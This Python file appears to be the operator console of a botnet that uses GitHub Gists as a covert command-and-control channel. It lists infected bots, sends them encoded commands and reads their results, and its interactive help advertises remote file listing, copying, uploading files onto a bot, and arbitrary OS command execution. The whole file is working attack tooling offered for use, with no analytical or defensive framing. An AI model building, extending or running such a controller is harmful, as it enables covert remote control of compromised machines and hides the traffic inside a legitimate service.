import json
import os

from gist import *
from util import *


class BotMaster:
    def __init__(self, token):
        self.api = GistApi(token)
        self.last_command_id = None
        self.last_bot_id = None
        self.selected_bot_id = None

    def bots(self):
        result = self.api.list()
        if not result.ok:
            log_error("Unable to get the bot list: %s", result.text)
            return
        result = json.loads(result.text)
        return [{
            'id': gist['id'],
            'registered': gist['created_at'],
            'updated': gist['updated_at'],
        } for gist in filter(lambda g: g['description'] == 'bot', result if result else [])]

    def select_bot(self, bot_id):
        self.selected_bot_id = bot_id

    def get_info(self, bot_id=None):
        if not bot_id and not self.selected_bot_id:
            log_error("Bot id is not provided.")
            return
        bot_id = self.selected_bot_id if bot_id is None else bot_id
        return self.api.fetch_file(bot_id, 'register').text

    def get_command_result(self, command_id, bot_id=None):
        if not bot_id and not self.selected_bot_id:
            log_error("Bot id is not provided.")
            return
        bot_id = self.selected_bot_id if not bot_id else bot_id
        if command_id:
            return self.api.fetch_file(bot_id, command_id).text

    def get_last_command_result(self):
        return self.get_command_result(self.last_command_id, self.last_bot_id)

    def history(self, bot_id=None):
        if not bot_id and not self.selected_bot_id:
            log_error("Bot id is not provided.")
            return
        bot_id = self.selected_bot_id if not bot_id else bot_id
        result = self.api.get(bot_id)
        if not result.ok:
            log_error("Unable to fetch the command history: %s", result.text)
            return
        result = json.loads(result.text)
        if result and result['files']:
            return [{
                        'command_id': file['filename'],
                        'command': decode_command(file['filename'])
                    } if file['filename'] != 'register' else None for file in result['files'].values()]

    def send_command(self, command, bot_id=None):
        if not bot_id and not self.selected_bot_id:
            log_error("Bot id is not provided.")
            return
        bot_id = self.selected_bot_id if not bot_id else bot_id
        command_id = encode_command(command)
        if len(command_id) > 2000:
            log_error("Command id is too long.")
            return
        result = self.api.upsert_file(bot_id, command_id, '.')
        if result.ok:
            self.last_bot_id = bot_id
            self.last_command_id = command_id
            return True
        else:
            log_error("Unable to send the command: %s", result.text)

    def interactive(self):
        def print_o(msg):
            sys.stdout.write('[%s]: %s\n' % (self.selected_bot_id, msg))

        import shlex
        while True:
            line = input('[%s]: ' % self.selected_bot_id)
            try:
                sp = shlex.split(str(line))
                if not sp:
                    continue
                if sp[0] == 'select':
                    if len(sp) < 2:
                        print_o('Invalid syntax. Use help')
                    self.select_bot(sp[1])
                    print_o('Selected ' + self.selected_bot_id)
                elif sp[0] == 'bots':
                    bots = self.bots()
                    for bt in bots if bots else []:
                        print_o(bt)
                elif sp[0] == 'history':
                    hs = self.history()
                    for cm in hs if hs else []:
                        print_o(cm)
                elif sp[0] == 'result':
                    print_o(self.get_command_result(sp[1]) if len(sp) > 1 else None)
                elif sp[0] == 'info':
                    print_o(self.get_info())
                elif sp[0] == 'last':
                    print_o(self.get_last_command_result())
                elif sp[0] == 'help':
                    print_o("""available interactive commands:
    bots - list all bots
    select <bot_id> - select a bot
    send <local_source_file> <remote_target_file> - send file to a current bot's environment
    cm <command and args> - send a command (to current bot). Available commands:
        ls <dir path> - list files in the directory
        cp <source> <target> - copy a remote file
        exec <command and args> - execute OS command
    history - print a command history (of selected bot)
    result <command_id> - print the result of a command (of current bot)
    info - print info about environment (of current bot)
    last - print the result of the last executed command
    help - for help
    exit - to exit""")
                elif sp[0] == 'exit':
                    return
                elif sp[0] == 'send':
                    if len(sp) < 3:
                        print_o('Invalid syntax. Use help')
                    data = encode_command(read_file(sp[1]))
                    print_o("Uploading file content " + sp[1])
                    result = self.api.create({'data': {'content': data}}, 'data')
                    if result.ok:
                        result = json.loads(result.text)
                        print_o("Successfully uploaded: file id = " + result['id'])
                    if self.send_command(['dd', sp[2], result['id']]):
                        print_o(('Sent command id: ' + self.last_command_id) if self.last_command_id else None)
                elif sp[0] == 'cm':
                    if self.send_command(sp[1:]):
                        print_o(('Sent command id: ' + self.last_command_id) if self.last_command_id else None)
                else:
                    print_o("Unknown command, use help")
            except Exception as e:
                print_o("Error: " + str(e))


if __name__ == "__main__":
    log_level = os.getenv("LOG_LEVEL", log_level)
    if len(sys.argv) < 2:
        print("Usage: bot_master.py <gist_api_token>")
        exit(1)
    bs = BotMaster(sys.argv[1])
    bs.interactive()
